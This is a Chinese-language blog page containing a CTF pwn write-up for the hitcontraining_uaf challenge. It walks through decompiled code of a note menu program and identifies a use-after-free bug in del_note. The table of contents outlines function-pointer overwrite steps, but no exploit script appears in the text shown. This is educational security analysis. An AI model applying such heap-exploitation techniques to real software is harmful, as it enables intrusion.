@@ -1,0 +1,565 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    UseAfterFree例题分析 | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="Use After Free 例题分析hitcontraining_uaf  main 函数分析123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UseAfterFree例题分析">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/UseAfterFree%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="Use After Free 例题分析hitcontraining_uaf  main 函数分析123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1772196945534-6815a67c-73d0-4610-a9be-afc14c1353c4-549320.png">
+<meta property="article:published_time" content="2026-04-28T11:14:15.331Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.361Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1772196945534-6815a67c-73d0-4610-a9be-afc14c1353c4-549320.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="UseAfterFree例题分析">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">UseAfterFree例题分析</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Use-After-Free-%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Use After Free 例题分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hitcontraining-uaf"><span class="toc-number">1.1.</span> <span class="toc-text">hitcontraining_uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">main 函数分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add-node-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">add_node()函数分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E-add-note-%E5%87%BD%E6%95%B0%E5%BD%93%E4%B8%AD%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">对于 add_note()函数当中的结构体分析：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#del-node-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">del_node()函数分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#print-note-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">1.1.4.</span> <span class="toc-text">print_note()函数分析:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#int-cdecl-DWORD-notelist-count-DWORD-notelist-count"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">(**((int (__cdecl ***)(_DWORD))&amp;notelist + count))(*((_DWORD *)&amp;notelist + count));</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#magic-%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.1.5.</span> <span class="toc-text">magic()后门函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.1.6.</span> <span class="toc-text">具体思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%A4%E6%AC%A1-add-note-%E5%87%BD%E6%95%B0%E5%88%9B%E5%BB%BA%E5%9B%9B%E4%B8%AA%E5%A0%86%E5%9D%97"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">两次 add_note 函数创建四个堆块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%A4%E6%AC%A1-del-note-%E5%87%BD%E6%95%B0%E5%88%A0%E9%99%A4%E5%B9%B6-free-%E5%9B%9B%E4%B8%AA%E5%A0%86%E5%9D%97"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">两次 del_note 函数删除并 free 四个堆块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1-add-note-b%E2%80%998%E2%80%99-p32-magic-%E5%88%9B%E5%BB%BA%E4%B8%A4%E4%B8%AA%E5%A0%86%E5%9D%97"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">第三次 add_note(b’8’,p32(magic))创建两个堆块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E7%94%A8printnote-b%E2%80%990%E2%80%99"><span class="toc-number">1.1.6.4.</span> <span class="toc-text">调用printnote(b’0’)</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-UseAfterFree例题分析" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T11:14:15.331Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="Use-After-Free-例题分析"><a href="#Use-After-Free-例题分析" class="headerlink" title="Use After Free 例题分析"></a>Use After Free 例题分析</h1><h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><img src="/HFTTC.github.io/images/pwn/1772196945534-6815a67c-73d0-4610-a9be-afc14c1353c4-549320.png" alt="1772196945534-6815a67c-73d0-4610-a9be-afc14c1353c4.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<h4 id="main-函数分析"><a href="#main-函数分析" class="headerlink" title="main 函数分析"></a>main 函数分析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl __noreturn main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> n2; // eax</span><br><span class="line">  char buf[<span class="number">4</span>]; // [esp+0h] [ebp-Ch] BYREF</span><br><span class="line">  <span class="built_in">int</span> *p_argc; // [esp+4h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, 4u);</span><br><span class="line">      n2 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( n2 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n2 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n2 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n2 == <span class="number">4</span> )</span><br><span class="line">          exit(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n2 != <span class="number">1</span> )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;       HackNote       &quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> printf(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">atoi</font>（ASCII to integer）的功能是：<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">把以 null 结尾的字符串 buf 转换成对应的十进制整数</font>，赋值给变量 <font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">n2</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">通过第一次输入，只能选择 1.2.3.4 四个选项，分别对应着不同的操作。</font></p>
+<h4 id="add-node-函数分析："><a href="#add-node-函数分析：" class="headerlink" title="add_node()函数分析："></a>add_node()函数分析：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> count; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">    <span class="type">size_t</span> size; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> n4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    count = ::count;                          <span class="comment">//读取全局变量count到局部变量</span></span><br><span class="line">    <span class="keyword">if</span> ( ::count &gt; <span class="number">5</span> )                        <span class="comment">//限制note的最多数量为5</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( n4 = <span class="number">0</span>; n4 &lt;= <span class="number">4</span>; ++n4 )</span><br><span class="line">    &#123;</span><br><span class="line">        count = *((_DWORD *)&amp;notelist + n4);  <span class="comment">//指针代替数组偏移，代指notelist[n4]</span></span><br><span class="line">        <span class="keyword">if</span> ( !count )                         <span class="comment">//如果指针为NULL</span></span><br><span class="line">        &#123;</span><br><span class="line">            *((_DWORD *)&amp;notelist + n4) = <span class="built_in">malloc</span>(<span class="number">8u</span>); <span class="comment">//为新note分配八字节的内存</span></span><br><span class="line">            <span class="keyword">if</span> ( !*((_DWORD *)&amp;notelist + n4) )       <span class="comment">//检查malloc是否分配成功</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            **((_DWORD **)&amp;notelist + n4) = print_note_content; <span class="comment">//设置note的指针为打印函数</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);                    <span class="comment">//读取8字节并转换笔记大小</span></span><br><span class="line">            read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">            size = atoi(buf);                         <span class="comment">//把size转换成十进制整数</span></span><br><span class="line">            v1 = *((_DWORD *)&amp;notelist + n4);         <span class="comment">//重新取出note[n4]的的结构体指针暂存到v1</span></span><br><span class="line">            *(_DWORD *)(v1 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);       <span class="comment">//分配相应大小的内存</span></span><br><span class="line">            <span class="keyword">if</span> ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + n4) + <span class="number">4</span>) ) <span class="comment">//检查是否分配失败</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);    <span class="comment">// 提示输入笔记内容</span></span><br><span class="line">            read(<span class="number">0</span>, *(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + n4) + <span class="number">4</span>), size); <span class="comment">//读取size字节，写入content的内存</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ++::count;       <span class="comment">//全局变量count+1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl print_note_content(<span class="built_in">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> puts(*(const char **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="对于-add-note-函数当中的结构体分析："><a href="#对于-add-note-函数当中的结构体分析：" class="headerlink" title="对于 add_note()函数当中的结构体分析："></a>对于 add_note()函数当中的结构体分析：</h5><p><font style="color:rgb(0, 0, 0);">*((_DWORD *)&amp;notelist + n4) &#x3D; malloc(8u); 在 32 位系统下一个指针占 4字节，8 字节正好是两个指针</font></p>
+<p><font style="color:#DF2A3F;"><em></font><font style="color:#585A5A;"></em>((_DWORD **)&amp;notelist + n4)</font><font style="color:rgb(0, 0, 0);"> &#x3D; print_note_content; </font></p>
+<p><font style="color:rgb(0, 0, 0);">第二次解引用，本质是对 </font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">note_ptr</font><font style="color:rgb(0, 0, 0);"> 解引用：</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">*note_ptr</font><font style="color:rgb(0, 0, 0);">，也就是 note_ptr[0]</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">**(二级指针) &#x3D; *(一级指针) &#x3D; 一级指针[0] &#x3D; 结构体偏移0x0处的值</font><font style="color:rgb(0, 0, 0);">。</font><font style="color:#DF2A3F;">两次引用相当于创建了一个结构体：</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct Note &#123;</span><br><span class="line">    void (*print_note_content)();  // 偏移<span class="number">0x0</span>，<span class="number">4</span>字节（函数指针）</span><br><span class="line">    void *content;         // 偏移<span class="number">0x4</span>，<span class="number">4</span>字节（内容指针）</span><br><span class="line">&#125;;</span><br><span class="line">note_ptr →  0xXXXX0000（结构体起始地址）</span><br><span class="line">            0xXXXX0000：函数指针（偏移<span class="number">0x0</span>）</span><br><span class="line">            0xXXXX0004：内容指针（偏移<span class="number">0x4</span>）</span><br></pre></td></tr></table></figure>
+
+<h4 id="del-node-函数分析："><a href="#del-node-函数分析：" class="headerlink" title="del_node()函数分析："></a><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">del_node()函数分析：</font></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">    <span class="type">int</span> count; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">    count = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( count &lt; <span class="number">0</span> || count &gt;= ::count )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = *((_DWORD *)&amp;notelist + count);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(*(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + count) + <span class="number">4</span>)); <span class="comment">//释放笔记内容的内存（content指针指向的堆内存）</span></span><br><span class="line">        <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;notelist + count));                  <span class="comment">//释放笔记结构体的内存（Note结构体本身的堆内存）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以指针代替数组下标，free 掉输入的 chunk，没有置 0，有 UAF 漏洞.</p>
